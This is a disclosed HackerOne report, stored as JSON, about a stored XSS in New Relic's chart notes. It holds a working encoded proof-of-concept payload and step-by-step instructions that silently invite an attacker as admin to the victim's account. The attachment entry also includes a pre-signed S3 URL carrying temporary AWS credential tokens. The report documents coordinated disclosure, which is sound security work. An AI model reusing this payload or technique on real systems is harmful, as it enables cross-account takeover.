@@ -1,0 +1,164 @@
+{
+  "id": 507132,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDcxMzI=",
+  "url": "https://hackerone.com/reports/507132",
+  "title": "Stored XSS in notes (charts) because of insecure chart data JSON generation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-03-09T12:43:35.570Z",
+  "submitted_at": "2019-03-09T12:43:35.570Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-13T13:27:02.333Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:35:13.416Z",
+  "team_member_agreed_on_going_public_at": "2020-08-13T13:27:02.174Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey team,\n\nI have discovered vulnerability of chart data JSON generation endpoint (when the chart is displayed inside a note) allowing attacker to inject arbitrary fields into it and leading to stored XSS. The impact is higher than usual here because the payload remains after publishing a note so the XSS is **cross-account**. The payload fires at infected note page after victim clicks a link.\n\n###Proof of Concept\nHere I crafted payload that adds new user with role `Admin` to victim's account. So attacker can publish infected note and every admin/owner clicking the link will invite attacker to his own account with admin privileges.\n{F438182}\n\n###Explanation\nThe vulnerability cause is improper user-input filtration at the chart data JSON generation step. When the user saves some chart to note, the following request is made:\n```http\nPOST /accounts/2260599/notes?agent_id=undefined HTTP/1.1\nHost: rpm.newrelic.com\n\nutf8=%E2%9C%93&authenticity_token=47f2Fr393aG89tWfS4byeeEoXdd09p3y8DtKzlZMXJE%3D&app_name=undefined&note_item%5Bswf%5D=&note_item%5Bbegin_time%5D=2019-03-06T04%3A17%3A33-08%3A00&note_item%5Bend_time%5D=2019-03-06T04%3A27%3A45-08%3A00&note_item%5Btitle%5D=TITLE&note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DMSLine%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DFunction%2526lt%253Bb%2526gt%253Ba%2526lt%253B%252Fb%2526gt%253B%252F__main__%253AMainHandler.get%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3DUNITS%26render_to%3D45055%26show_events%3Dtrue%26subtitle%3DSUBTITLE%26title%3DTITLE%26tw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265%26value%3Dstandard_deviation%26no_click%3D1%26no_links%3D1&note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14736%3Ftw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265&note_item%5Bnote_text%5D=&note_action=create&note_id=6075&action_after=save_and_close\n```\nParameter `note_item[data_url]` is URL that contains all information about storing chart: account ID, application ID, etc, as well as chart `title`, `subtitle` and `number_suffix`. As I understand, this URL is parsed at the note saving, and all parameters are stored at DB.\nThen, when a note with stored chart is opened, the Highcharts chart URL at this page is set to something like `https://rpm.newrelic.com/accounts/2260599/notes/6077/items/12992/chart_data`. The endpoint above gets the stored `note_item[data_url]` parameters from DB and generates the chart data JSON, that contains everything is needed to draw the chart.\n\nThe vulnerability itself is that at least `title`, `subtitle` and `number_suffix` parameters are HTML-unescaped before they are injected into resulting JSON. So if some of these parameters contains the `&quot;` the resulting JSON becomes broken, for instance:\n{\"title\": \"<title>\"}\nbecomes\n{\"title\": \"**title_with_quot\"**\"}.\n\nThat's the way an attacker can inject arbitrary fields at this JSON.\n\nI am not pretty familiar with the Highcharts JS API but I investigated a little and discovered the `credits` field that is a link with text and href, that can be appended to chart. So in my PoC I injected into chart data JSON some content like the following:\n```json\n{\n  \"credits\": {\n    \"enabled\": true,\n    \"text\": \"click here\",\n    \"href\": \"javascript:alert()\",\n    \"style\": {\n      \"fill\": \"red\"\n    },\n    \"position\": {\n      \"verticalAlign\": \"top\"\n    }\n  }\n}\n```\nThe actual payload is a little more complicated, but this is the main concept.\nIn this way, after the fields are retrieved from DB and the JSON is crafted, the resulting JSON contains an order for Highcharts to draw the credits with malicious link.\n\n###Steps to reproduce:\n1. Sign into New Relic app with some account (attacker)\n2. Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3. Find the parameter `subtitle` inside the data-url parameter `note_item%5Bdata_url%5D` and replace its value with \n```\n%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%37%32%25%36%35%25%36%34%25%36%39%25%37%34%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%32%25%36%35%25%36%36%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%61%25%36%31%25%37%36%25%36%31%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%61%25%37%36%25%36%31%25%37%32%25%32%30%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%33%64%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%33%25%36%66%25%36%66%25%36%62%25%36%39%25%36%35%25%32%65%25%36%64%25%36%31%25%37%34%25%36%33%25%36%38%25%32%38%25%32%66%25%36%31%25%36%61%25%37%33%25%35%66%25%36%37%25%37%32%25%36%66%25%37%35%25%37%30%25%35%66%25%36%39%25%36%34%25%33%64%25%32%38%25%35%63%25%36%34%25%32%36%25%32%33%25%37%38%25%33%32%25%36%32%25%33%62%25%32%39%25%32%66%25%32%39%25%35%62%25%33%31%25%35%64%25%33%62%25%37%36%25%36%31%25%37%32%25%32%30%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%33%64%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%39%25%36%35%25%37%37%25%33%61%25%37%62%25%37%35%25%37%33%25%36%35%25%37%32%25%33%61%25%37%62%25%36%36%25%37%35%25%36%63%25%36%63%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%33%61%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%32%25%32%63%25%36%35%25%36%64%25%36%31%25%36%39%25%36%63%25%33%61%25%32%32%25%36%31%25%37%34%25%37%34%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%30%25%37%33%25%36%62%25%36%31%25%37%36%25%36%31%25%36%65%25%37%33%25%32%65%25%37%32%25%37%35%25%32%32%25%37%64%25%32%63%25%36%63%25%36%35%25%37%36%25%36%35%25%36%63%25%33%61%25%32%32%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%32%25%37%64%25%37%64%25%33%62%25%32%34%25%32%65%25%36%31%25%36%61%25%36%31%25%37%38%25%32%38%25%37%62%25%37%35%25%37%32%25%36%63%25%33%61%25%36%30%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%32%25%37%30%25%36%64%25%32%65%25%36%65%25%36%35%25%37%37%25%37%32%25%36%35%25%36%63%25%36%39%25%36%33%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%35%66%25%36%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%66%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%37%33%25%32%66%25%32%34%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%37%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%36%65%25%36%35%25%37%37%25%36%30%25%32%63%25%36%34%25%36%31%25%37%34%25%36%31%25%33%61%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%32%39%25%32%63%25%36%38%25%36%35%25%36%31%25%36%34%25%36%35%25%37%32%25%37%33%25%33%61%25%37%62%25%32%32%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%37%34%25%37%39%25%37%30%25%36%35%25%32%32%25%33%61%25%32%30%25%32%32%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%36%61%25%37%33%25%36%66%25%36%65%25%32%32%25%37%64%25%32%63%25%37%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%32%25%37%30%25%36%66%25%37%33%25%37%34%25%32%32%25%32%63%25%36%31%25%37%33%25%37%39%25%36%65%25%36%33%25%33%61%25%36%36%25%36%31%25%36%63%25%37%33%25%36%35%25%37%64%25%32%39%25%33%62%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%30%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%30%25%37%37%25%36%31%25%37%33%25%32%30%25%36%39%25%36%65%25%37%36%25%36%39%25%37%34%25%36%35%25%36%34%25%32%32%25%32%39%25%33%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%35%25%37%38%25%37%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%33%25%36%66%25%36%64%25%36%35%25%37%34%25%36%38%25%36%39%25%36%65%25%36%37%25%32%30%25%36%39%25%37%33%25%32%30%25%37%37%25%37%32%25%36%66%25%36%65%25%36%37%25%32%30%25%36%31%25%37%34%25%32%30%25%36%66%25%37%35%25%37%32%25%32%30%25%36%35%25%36%65%25%36%34%25%32%65%25%32%30%25%35%30%25%36%63%25%36%35%25%36%31%25%37%33%25%36%35%25%32%30%25%36%33%25%36%63%25%36%39%25%36%33%25%36%62%25%32%30%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%37%34%25%36%66%25%32%30%25%37%32%25%36%35%25%37%34%25%37%32%25%37%39%25%32%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%37%34%25%37%39%25%36%63%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%66%25%36%63%25%36%66%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%32%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%36%25%36%66%25%36%65%25%37%34%25%35%33%25%36%39%25%37%61%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%32%25%33%30%25%37%30%25%37%38%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%35%25%36%65%25%37%34%25%36%35%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%36%25%36%35%25%37%32%25%37%34%25%36%39%25%36%33%25%36%31%25%36%63%25%34%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%66%25%37%30%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%33%25%33%30%25%37%64%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62\n```\nThe double URL encoding is used here because this parameter value is URL inside URL.\n4. Send edited request.\n5. Open the newest note and make sure it contains a red credits link at the top of chart.\n6. Press the link and wait for alert box is popped up.\n7. Go to the users page and make sure there is new admin user \"ATTACKER\" invited.\n\n###Mitigation\n\nYou should properly escape the vulnerable parameters to not give attacker an opportunity to break JSON fields.\n\nPlease reach me if you need some extra information for discovering or mitigating the bug.\n\n## Impact\n\nAttacker can publish infected note and get full access to account of any admin/owner which clicks the vulnerable link.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 438182,
+      "file_name": "newrelic_stored_xss_charts.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/182/80613a4809647f4bd5cc74816e371e4170d3d56b/newrelic_stored_xss_charts.mov?response-content-disposition=attachment%3B%20filename%3D%22newrelic_stored_xss_charts.mov%22%3B%20filename%2A%3DUTF-8%27%27newrelic_stored_xss_charts.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6PGWSTMP%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131905Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCViOi%2F56ueEuvIwenQe%2BLb%2BwbBeFYt95o%2B27q1gAyjJQIhAJy41GZeNB%2F35zQFEMMldvRn9RKuTJ921mYFGjWXM4xOKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igyfj5amkH4Q4qV17RUqjwW2CAxiK4m4hWEAlsDvzI4tTbj8wtQkEbV8t3TJ6TszDYzbxoZfKv%2FF1ngpPiZtnooExkiPG26fSsSPVxr95a5R%2Bb53aIMfs4cvspAbjO408u%2FKZN5zXVPh6CnfCbsN8F6X%2F9KN%2Fbv66jc7vpds0BIK8%2B6fFbH50L%2BJ7loxPgYJpwQKPGA%2BxAU3n4cW0xu40kEa4HScwwT%2BqFoMNkHSPq7v%2FMX6cc1VRdiCryuyIqwF%2Bs0t%2FvdjeVHg78LS0%2FuMMNkbwDSMNufKbDqARDuoU0P%2F7njwSrXV5%2BkRLbGbe0L89dhffkGntr%2Bd%2FtQ8CCYU66m%2FjoL0k41lI2HeR3O7pLZw6xc3baudQgvKzzU8naKjeMtCWmGIlkN1deTGbW6VWFv94mPhh6xqwYF%2FygK1ASZXWcjKuCZDkbIOgvNsJXfi9GobE%2Fg%2FQCvqFLRdBFuYpEHQ%2BmeEDcfMacgRXA297IImF0dUJN85r5YBUSsTgEED3A1n%2BDuZ7EYlyHsa0FOqtqBvavx526YAyqmogm2M05wZ7943732ur203IxCn9N2G019Q9wlJDIhQKk2ujbfG2QJJ9kcZT0%2FclqOtb7n1O02fUwDgOTGWF7a6VW3W7hV6bjCy%2B5Rac9PzkS6VymX8vtLX1k%2FZgwFkOteSUd2%2FRZ6WSu3ZzHNAUkrRcuUOocwK48DWkjTuzKGjaWSycV5T7TkIYO82PSRCe3%2FO3LFd%2F1MQ3Lt2TctQHWcm%2FuYG8L64tYNCvpptkP4lbIEMyLovg2Tcvod1IiJWSFCfdjo3%2F62cnjstu7oIkOgQE1rNQRi7tl%2BOpOZ3O2p1%2BkSM9%2F0IDEkXXc43X4wqyrJxFCXTAgtGobNnX8BPw1JLWKKzcjvCMLC1ra4GOrABG6HOSlDmK1pVHFgvG0UCsHX0y77qrI5WogVE2SsoeRtdX%2BFgr0TJVFxF%2FqzndNjCSF1CE7s5o1cvQRnubzfIEHh%2Bql4Yr2YDxqHDFub6HZHglXezaL0SQVMK924Vna4%2Fd7oHIUZe52JuzZ8HuqQcy4plSO1mkvy6u0L4T%2F1njIpact7INdijf%2B1WFhWhjy0qA%2BmL%2BCVvUwMMaTaqrHm4JzWtOGywBhoyvrV0SfdDvYQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f097fb5e0821fa313c98d49631eb48925110508ce58c36d938419886ee73859a",
+      "file_size": 5777063,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-10T09:35:13.488Z",
+  "allow_singular_disclosure_after": -108099832.23911653,
+  "singular_disclosure_allowed": true,
+  "vote_count": 146,
+  "voters": [
+    "alganad",
+    "cxzer0",
+    "wi11",
+    "grimnir",
+    "jensec",
+    "p1stachios",
+    "mashoud1122",
+    "sameerphad72",
+    "spongebhav",
+    "e4366eolywrgpidfbio",
+    "and 136 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18678,
+    "asset_type": "URL",
+    "asset_identifier": "rpm.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 126731,
+      "category": "researcher",
+      "content": "My Telegram channel about being the full-time bug bounty hunter, my tips and tricks:\n🇺🇸 [BugBountyPLZen](https://t.me/+mY0ndZYzGbYxYmYy)\n\nМой Telegram-канал про фуллтайм баг-хантинг, советы и методики:\n🇷🇺 [BugBountyPLZ](https://t.me/+WYgyG5n2_kM1Yzdi)",
+      "user": {
+        "id": 14089,
+        "username": "skavans",
+        "name": "Anton Subbotin",
+        "bio": "Swapped my office work for the bounty hunting ⚔️",
+        "cleared": false,
+        "verified": false,
+        "website": "https://skavans.ru/en/",
+        "location": "Russia",
+        "created_at": "2014-11-14T23:02:26.903Z",
+        "url": "https://hackerone.com/skavans",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
